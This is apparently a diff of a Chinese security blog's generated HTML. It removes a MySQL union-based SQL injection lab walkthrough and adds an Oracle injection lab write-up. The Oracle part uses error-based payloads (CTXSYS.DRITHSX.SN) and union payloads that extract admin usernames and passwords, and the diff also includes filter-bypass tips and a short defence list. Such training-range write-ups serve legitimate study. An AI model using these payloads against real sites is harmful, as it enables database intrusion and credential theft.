-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-03-07 23:28:21" itemprop="dateModified" datetime="2023-03-07T23:28:21+08:00">2023-03-07</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="SQL注入-联合注入【数字型】"><a href="#SQL注入-联合注入【数字型】" class="headerlink" title="SQL注入-联合注入【数字型】"></a>SQL注入-联合注入【数字型】</h1><hr>
-<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><blockquote>
-<p><strong>注入的本质</strong></p>
-</blockquote>
-<p>用户输入的数据被当做代码执行</p>
-<blockquote>
-<p><strong>注入条件</strong></p>
-</blockquote>
-<p>用户可以控制传参</p>
-<p>用户输入的语句被带入数据库并执行</p>
-<blockquote>
-<p><strong>显错注入原理</strong></p>
-</blockquote>
-<p>用户输入的数据被当做SQL语句执行，并带入数据库执行</p>
-<p>对用户输入的数据没有做任何过滤，并且将结果返回到页面</p>
-<h2 id="注入基础"><a href="#注入基础" class="headerlink" title="注入基础"></a>注入基础</h2><blockquote>
-<p><strong>MySQL数据库基本认知</strong></p>
-</blockquote>
-<p>MYSQL5.0以上版本，将自带information_schema数据库<br>information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等 。<br>该数据库中有两张表tables和columns</p>
-<p>TABLES：提供了关于数据库中的表的信息，详细表述了某个表属于哪个schema，<br>表类型，表引擎，创建时间等信息。tables表中 table_name字段表示 表的名字，<br>table_schema 字段表示数据库名（数据表所属的数据库名）</p>
-<p>COLUMNS：提供了表中的列信息，详细表述了某张表的所有列以及每个列的信息，某个列属于哪个表。<br>columns表中table_schema字段为数据库名，table_name字段为表的名字，column_name字段为列的名字</p>
 <ul>
-<li>information_schema.tables 存放表名和库名的对应</li>
-<li>information_schema.columns 存放字段名和表名的对应</li>
+<li>–hex 对payload进行16进制编码</li>
+<li>–batch 默认选项</li>
 </ul>
-<blockquote>
-<p><strong>显错注入所用函数</strong></p>
-</blockquote>
-<p>order by –&gt;对字段进行排序<br>group_concat() –&gt;将字符连接起来，输出字符串集合，逗号分开<br>limit start end 限制select的输出数量<br>database() –&gt;当前所用数据库名<br>version() –&gt;数据库版本号<br>user() –&gt;用户名</p>
-<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p>1、进入靶场<br><img src="https://img-blog.csdnimg.cn/20210408110142919.png" alt="在这里插入图片描述"><br>2 、将id&#x3D;1处1改为2<br><img src="https://img-blog.csdnimg.cn/20210408110218951.png" alt="在这里插入图片描述"></p>
-<p>3、轻松得知：该页面是通过id进行传参，通过改变id的值页面返回不同的内容<br>4、分别使用and 1&#x3D;1 和and 1&#x3D;2 进行探测<br><img src="https://img-blog.csdnimg.cn/20210408110254245.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210408110307215.png" alt="在这里插入图片描述"><br>5、观察页面发生了变化，使用order by 判断字段数 [一般通过二分法判断]<br><img src="https://img-blog.csdnimg.cn/20210408110416210.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210408110449477.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210408110509135.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210408110520351.png" alt="在这里插入图片描述"><br>6、得知字段数为3，使用联合查询</p>
-<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">UNION</span> 操作符用于连接两个以上的 <span class="built_in">SELECT</span> 语句的结果组合到一个结果集合中。</span><br><span class="line">多个 <span class="built_in">SELECT</span> 语句会删除重复的数据</span><br></pre></td></tr></table></figure>
+<h2 id="剔除union和select的绕过"><a href="#剔除union和select的绕过" class="headerlink" title="剔除union和select的绕过"></a>剔除union和select的绕过</h2><p>大小写绕过 双写绕过</p>
+<h1 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h1><h2 id="代码层面"><a href="#代码层面" class="headerlink" title="代码层面"></a>代码层面</h2><p>对输入进行严格的转义和过滤</p>
+<p>使用预处理和参数化</p>
+<p>白名单</p>
+<p>黑名单</p>
+<p>规范输出</p>
+<p>敏感字符过滤</p>
+<h2 id="网络层面"><a href="#网络层面" class="headerlink" title="网络层面"></a>网络层面</h2><p>通过WAF设备</p>
+<p>云端防护</p>
+<h2 id="PHP转义-过滤"><a href="#PHP转义-过滤" class="headerlink" title="PHP转义+过滤"></a>PHP转义+过滤</h2><h2 id="预处理-参数化"><a href="#预处理-参数化" class="headerlink" title="预处理+参数化"></a>预处理+参数化</h2>
+      
+    </div>
 
-<p>0 union select 1,2,3<br>观察回显点<br><img src="https://img-blog.csdnimg.cn/20210408110943523.png" alt="在这里插入图片描述"><br>7、回显点2,3，使用version()和database() 获得版本号和当前数据库的名称<br><img src="https://img-blog.csdnimg.cn/20210408111316475.png" alt="在这里插入图片描述"><br>8、得知MySQL版本号为5.0以上版本，所以可以使用MySQL自带数据库information_schema中的table和column表爆出数据<br>9、使用group_concat 爆出当前数据库下的所有表名<br><img src="https://img-blog.csdnimg.cn/2021040811211494.png" alt="在这里插入图片描述"><br>10、查询users表下的所有字段<br><img src="https://img-blog.csdnimg.cn/20210408133057977.png" alt="在这里插入图片描述"></p>
-<p>11、查看user和password字段信息</p>
-<p>第一种方法：使用limit 依次得出信息<br><img src="https://img-blog.csdnimg.cn/20210408133338331.png" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20210408133349582.png" alt="在这里插入图片描述"><br>第二种：使用group_concat()得出信息<br><img src="https://img-blog.csdnimg.cn/20210408133500166.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="后端代码"><a href="#后端代码" class="headerlink" title="后端代码"></a>后端代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
+    
+    
+    
 
-<p>接收id变量的传参，将id的传参值带入数据库进行查询</p>
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/25/SQL%E6%B3%A8%E5%85%A5-Oracle%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/kilig.gif">
+      <meta itemprop="name" content="kiligwh">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="kilig's Blog">
+      <meta itemprop="description" content="欢迎">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | kilig's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/11/25/SQL%E6%B3%A8%E5%85%A5-Oracle%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">SQL注入-Oracle报错注入</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-11-25 10:30:48" itemprop="dateCreated datePublished" datetime="2022-11-25T10:30:48+08:00">2022-11-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-03-07 21:28:35" itemprop="dateModified" datetime="2023-03-07T21:28:35+08:00">2023-03-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="SQL注入-Oracle报错注入"><a href="#SQL注入-Oracle报错注入" class="headerlink" title="SQL注入-Oracle报错注入"></a>SQL注入-Oracle报错注入</h1><hr>
+<h2 id="Oracle概述"><a href="#Oracle概述" class="headerlink" title="Oracle概述"></a>Oracle概述</h2><p>1、Oracle数据库属于甲骨文公司，关系型数据库管理系统，数据库</p>
+<p>2、讲究语法严谨<br>select 字段名 from 表名</p>
+<p>3、dual表—&gt;虚表 专门用于满足数据库语句结构的表<br>大部分数据库是数据敏感大小写，语句是不敏感大小写</p>
+<p>4、Oracle系统自带表：<br>没有库的概念，只有用户的概念<br>查询出所有的表： select from all_tables<br>查询用户所创建的表：select from user_tables<br>查询所有的字段：select from all_tab_columns<br>查询出用户的字段：select from user_tab_columns<br>查版本：select * from v$version<br>order by 排序<br>user_tables 用于存放用户创建的表名等(表中字段名有 table_name)<br>user_tab_columns 用于存放用户创建的字段名等(表中的字段名有table_name,column_name)</p>
+<p>5、页面往往只会返回一条数据<br>rownum字段 Oracle数据库会在表中自动加上rownum字段，起到统计作用</p>
+<p>6、Oracle数据库不支持limit</p>
+<p>7、a &lt;&gt; b &#x3D;&#x3D;&gt; a不等于b</p>
+<p>8、不能使用limit 但可以使用别名</p>
+<p>子查询，将查询出来的数据rownnum 起个别名 ，子查询出来的数据可以是一张表<br>select * from (select rownum no,table_name from user_tab_columns) where no &#x3D;1<br>select rownum no,table_name from user_tab_columns 将查询出来的table_name字段和no字段 作为新的一张表</p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>所用函数<br>CTXSYS.DRITHSX.SN（user,(SQL语句)）<br>去查询关于主题的对应关键词，然后因为查询失败（应该是这个用户没有创建和查询的权限，默认情况没有创建，爆出未查询到的错误从而爆出查询的内容）</p>
+<p>1、查出表名<br>构造payload:</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span>=CTXSYS.DRITHSX.SN（<span class="number">1</span>,(<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> (<span class="keyword">select</span> rownum num,<span class="built_in">table_name</span> <span class="keyword">from</span> user_tables) </span><br><span class="line"><span class="keyword">where</span> num=<span class="number">1</span>)）</span><br></pre></td></tr></table></figure>
+
+<p>分析：<br>从(select rownum num,table_name from user_tables) 里面查询字段table_name的值<br>select rownum num,table_name from user_tables<br>&#x3D;&#x3D;》查询user_tables表中的table_name字段,并将rownum取别名 num<br>当num&#x3D;1时，取出num等于1所在行的table_name值并返回给上层的table_name<br><img src="https://img-blog.csdnimg.cn/2021041017563360.png" alt="在这里插入图片描述"></p>
+<p>得出第一个表名NEWS<br><img src="https://img-blog.csdnimg.cn/20210410175542770.png" alt="在这里插入图片描述"></p>
+<p>将num&#x3D;1改为num&#x3D;2<br>得出第二张表名MD5<br><img src="https://img-blog.csdnimg.cn/20210410175559562.png" alt="在这里插入图片描述"></p>
+<p>将num&#x3D;2改为num&#x3D;3<br>得出第三张表名ADMIN<br><img src="https://img-blog.csdnimg.cn/2021041017560847.png" alt="在这里插入图片描述"></p>
+<p>将num&#x3D;3改为num&#x3D;4<br>没有信息<br><img src="https://img-blog.csdnimg.cn/20210410175702437.png" alt="在这里插入图片描述"></p>
+<p>得出共三张表 ADMIN MD5 NEWS</p>
+<p>2、构造payload得出ADMIN表中的字段名</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> <span class="built_in">table_name</span>=’<span class="keyword">ADMIN</span>’ <span class="keyword">and</span> rownum=<span class="number">1</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=CTXSYS.DRITHSX.SN（<span class="keyword">user</span>,(<span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span></span><br><span class="line"> <span class="built_in">table_name</span>=’<span class="keyword">ADMIN</span>’ <span class="keyword">and</span> rownum=<span class="number">1</span>)）</span><br></pre></td></tr></table></figure>
+
+<p>查出第一个字段名UNAME<br><img src="https://img-blog.csdnimg.cn/20210410175825468.png" alt="在这里插入图片描述"></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span>=CTXSYS.DRITHSX.SN（<span class="keyword">user</span>,(<span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> <span class="built_in">table_name</span>=’<span class="keyword">ADMIN</span>’ </span><br><span class="line"><span class="keyword">and</span> <span class="built_in">column_name</span> &lt;&gt;’UNAME’)</span><br></pre></td></tr></table></figure>
+
+<p>得出第二个字段名UPASS<br><img src="https://img-blog.csdnimg.cn/20210410175909250.png" alt="在这里插入图片描述"></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span>=CTXSYS.DRITHSX.SN（<span class="keyword">user</span>,(<span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> <span class="built_in">table_name</span>=’<span class="keyword">ADMIN</span>’ <span class="keyword">and</span> <span class="built_in">column_name</span> &lt;&gt;’UNAME’ <span class="keyword">and</span> <span class="built_in">column_name</span> &lt;&gt;’UPASS’)）</span><br></pre></td></tr></table></figure>
+
+<p>没有信息<br><img src="https://img-blog.csdnimg.cn/20210410175924842.png" alt="在这里插入图片描述"></p>
+<p>ADMIN表共2个字段 UNAME UPASS</p>
+<p>3、构造payload，查出数据信息</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span>=CTXSYS.DRITHSX.SN（<span class="keyword">user</span>,(<span class="keyword">select</span> uname <span class="keyword">from</span> (<span class="keyword">select</span> rownum num,uname,upass <span class="keyword">from</span> <span class="keyword">admin</span>) <span class="keyword">where</span> num=<span class="number">1</span>)）</span><br><span class="line">uanme的第一个值为OCI</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/2021041017594789.png" alt="在这里插入图片描述"></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span>=CTXSYS.DRITHSX.SN（<span class="keyword">user</span>,(<span class="keyword">select</span> uname <span class="keyword">from</span> (<span class="keyword">select</span> rownum num,uname,upass <span class="keyword">from</span> <span class="keyword">admin</span>) <span class="keyword">where</span> num=<span class="number">2</span>)）</span><br><span class="line">uname的第二个值是NF</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/2021041018000350.png" alt="在这里插入图片描述"></p>
+<p>查出NF的upass字段信息</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span>=CTXSYS.DRITHSX.SN（<span class="keyword">user</span>,(<span class="keyword">select</span> upass <span class="keyword">from</span> (<span class="keyword">select</span> rownum num,uname,upass <span class="keyword">from</span> <span class="keyword">admin</span>) <span class="keyword">where</span> num=<span class="number">2</span>)）</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210410180015188.png" alt="在这里插入图片描述"></p>
+<p>4、得到flag，通关</p>
+<h2 id="显错注入"><a href="#显错注入" class="headerlink" title="显错注入"></a>显错注入</h2><p>1、进入靶场<br><img src="https://img-blog.csdnimg.cn/20210410180121421.png" alt="在这里插入图片描述"></p>
+<p>2、使用and 1&#x3D;1，正常<br><img src="https://img-blog.csdnimg.cn/2021041018013394.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>3、使用and 1&#x3D;2，报错<br><img src="https://img-blog.csdnimg.cn/20210410180145812.png" alt="在这里插入图片描述"></p>
+<p>4、存在注入点，使用order by 判断字段数<br>order by 5 报错<br><img src="https://img-blog.csdnimg.cn/20210410180203205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>order by 4 正常<br><img src="https://img-blog.csdnimg.cn/20210410180215990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>得出字段数为4</p>
+<p>5、使用联合查询 探测输出点<br>构造payload：-1 union select 1,2,3,4 报错<br><img src="https://img-blog.csdnimg.cn/20210410180247598.png" alt="在这里插入图片描述"></p>
+<p>6、不是MySQL数据库，试一试dual表呢<br>构造payload：-1 union select 1,2,3,4 from dual<br>还是报错<br><img src="https://img-blog.csdnimg.cn/20210410180303105.png" alt="在这里插入图片描述"></p>
+<p>7、会不会是数据类型呢？<br>构造payload：-1 union select null,null,null,null from dual<br>没有报错</p>
+<p><img src="https://img-blog.csdnimg.cn/20210410180313980.png" alt="在这里插入图片描述"></p>
+<p>8、探测4个字段数的数据类型<br>改第一个null为1<br>无变化，知第一个null为数字型<br><img src="https://img-blog.csdnimg.cn/202104101803266.png" alt="在这里插入图片描述"></p>
+<p>改第二个字段数null分别为1，‘a’ 都是报错<br><img src="https://img-blog.csdnimg.cn/20210410180338814.png" alt="在这里插入图片描述"></p>
+<p>第三个字段数与第二个相同，都是报错<br><img src="https://img-blog.csdnimg.cn/20210410180358596.png" alt="在这里插入图片描述"></p>
+<p>探测第四个字段数，改null为2<br>有变化<br><img src="https://img-blog.csdnimg.cn/20210410180412842.png" alt="在这里插入图片描述"></p>
+<p>会不会是一个时间戳类型的呢 将2改为当前的时间戳填入<br><img src="https://img-blog.csdnimg.cn/20210410180429904.png" alt="在这里插入图片描述"></p>
+<p>确认第一个为数字型，第四个为时间戳，第二、三个不知</p>
+<p>9、试一试to_nchar()<br>to_nchar()将varchar2转为nvarchar2<br>有回显<br><img src="https://img-blog.csdnimg.cn/20210410180455546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>10、构造payload查出表名</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> user_tables</span><br><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, to_nchar(<span class="built_in">table_name</span>),<span class="keyword">null</span>,<span class="number">2</span> <span class="keyword">from</span> user_tables</span><br></pre></td></tr></table></figure>
+
+<p>查出一个表名 ADMIN<br><img src="https://img-blog.csdnimg.cn/2021041018053825.png" alt="在这里插入图片描述"></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, to_nchar(<span class="built_in">table_name</span>),<span class="keyword">null</span>,<span class="number">2</span> <span class="keyword">from</span> user_tables <span class="keyword">where</span> <span class="built_in">table_name</span> &lt;&gt; ‘<span class="keyword">ADMIN</span>’</span><br></pre></td></tr></table></figure>
+
+<p>查出第二个表名 MD5<br><img src="https://img-blog.csdnimg.cn/20210410180600650.png" alt="在这里插入图片描述"></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, to_nchar(<span class="built_in">table_name</span>),<span class="keyword">null</span>,<span class="number">2</span> <span class="keyword">from</span> user_tables <span class="keyword">where</span> <span class="built_in">table_name</span> &lt;&gt; ‘<span class="keyword">ADMIN</span>’ <span class="keyword">and</span> </span><br><span class="line"><span class="built_in">table_name</span> &lt;&gt; ‘MD5’</span><br></pre></td></tr></table></figure>
+
+<p>查出第三个表名 NEWS<br><img src="https://img-blog.csdnimg.cn/20210410180632698.png" alt="在这里插入图片描述"></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, to_nchar(<span class="built_in">table_name</span>),<span class="keyword">null</span>,<span class="number">2</span> <span class="keyword">from</span> user_tables <span class="keyword">where</span> <span class="built_in">table_name</span> &lt;&gt; ‘<span class="keyword">ADMIN</span>’ </span><br><span class="line"><span class="keyword">and</span> <span class="built_in">table_name</span> &lt;&gt; ‘MD5’ <span class="keyword">and</span> <span class="built_in">table_name</span> &lt;&gt;’NEWS’</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210410180721607.png" alt="在这里插入图片描述"></p>
+<p>共三个表名：ADMIN MD5 NEWS</p>
+<p>11、flag可能在admin表中，查出admin表的字段名<br>构造payload：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> <span class="built_in">table_name</span>=’<span class="keyword">ADMIN</span>’</span><br><span class="line">id=<span class="number">1.2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,to_nchar(<span class="built_in">column_name</span>),<span class="keyword">null</span>,<span class="number">2</span> <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> <span class="built_in">table_name</span>=’<span class="keyword">ADMIN</span>’</span><br></pre></td></tr></table></figure>
+
+<p>得到第一个字段名 UNAME<br><img src="https://img-blog.csdnimg.cn/20210410180815231.png" alt="在这里插入图片描述"></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,to_nchar(<span class="built_in">column_name</span>),<span class="keyword">null</span>,<span class="number">2</span> <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> <span class="built_in">table_name</span>=’<span class="keyword">ADMIN</span>’ </span><br><span class="line"><span class="keyword">and</span> <span class="built_in">column_name</span> &lt;&gt; ‘UNAME’</span><br></pre></td></tr></table></figure>
+
+<p>得到第二个字段名 UPASS<br><img src="https://img-blog.csdnimg.cn/20210410180831815.png" alt="在这里插入图片描述"></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1.2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,to_nchar(<span class="built_in">column_name</span>),<span class="keyword">null</span>,<span class="number">2</span> <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> <span class="built_in">table_name</span>=’<span class="keyword">ADMIN</span>’  </span><br><span class="line"><span class="keyword">and</span> <span class="built_in">column_name</span> &lt;&gt; ‘UNAME’ <span class="keyword">and</span> <span class="built_in">column_name</span> &lt;&gt; ‘UPASS’</span><br></pre></td></tr></table></figure>
+
+<p>没有找到对应的数据<br><img src="https://img-blog.csdnimg.cn/20210410180850196.png" alt="在这里插入图片描述"></p>
+<p>得出admin表中有2个字段，uname 和 upass<br>12、得到字段中的数据</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> uname,upass <span class="keyword">from</span> <span class="keyword">admin</span></span><br></pre></td></tr></table></figure>
+
+<p>构造payload：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1.2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,to_nchar(UNAME),to_nchar(UPASS),<span class="keyword">null</span> <span class="keyword">from</span> <span class="keyword">ADMIN</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210410180920338.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>13、得到flag，通关</p>
 
       
     </div>
@@ -1315,7 +1181,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/07/SQL%E6%B3%A8%E5%85%A5%E6%A6%82%E8%BF%B0/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/23/SQL%E6%B3%A8%E5%85%A5-%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/kilig.gif">
@@ -1333,7 +1199,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/11/07/SQL%E6%B3%A8%E5%85%A5%E6%A6%82%E8%BF%B0/" class="post-title-link" itemprop="url">SQL注入概述</a>
+          <a href="/2022/11/23/SQL%E6%B3%A8%E5%85%A5-%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">SQL注入-反弹注入</a>
         </h2>
 
         <div class="post-meta-container">
@@ -1344,14 +1210,14 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2022-11-07 16:11:40" itemprop="dateCreated datePublished" datetime="2022-11-07T16:11:40+08:00">2022-11-07</time>
+      <time title="创建时间：2022-11-23 14:50:48" itemprop="dateCreated datePublished" datetime="2022-11-23T14:50:48+08:00">2022-11-23</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-03-07 21:29:03" itemprop="dateModified" datetime="2023-03-07T21:29:03+08:00">2023-03-07</time>
+      <time title="修改时间：2023-03-07 21:29:00" itemprop="dateModified" datetime="2023-03-07T21:29:00+08:00">2023-03-07</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1373,49 +1239,345 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="SQL注入概述"><a href="#SQL注入概述" class="headerlink" title="SQL注入概述"></a>SQL注入概述</h1><hr>
-<h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><p>SQL（Structured Query Language） – 结构化查询语句</p>
-<p>用途：用于存取数据以及查询、更新和管理<strong>关系数据库系统</strong></p>
-<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>SQL注入是服务器端<strong>未严格校验</strong>客户端发送的数据，而导致服务器端SQL语句被<strong>恶意修改</strong>并<strong>成功执行</strong>的行为</p>
-<p><strong>本质：把用户输入的数据当作代码执行</strong></p>
-<h2 id="注入产生原因"><a href="#注入产生原因" class="headerlink" title="注入产生原因"></a>注入产生原因</h2><p>代码对带入SQL语句的参数过滤不严格</p>
-<p>未启用框架的安全配置。例如：PHP的magic_quotes_gpc</p>
-<p>未使用框架安全的查询方法</p>
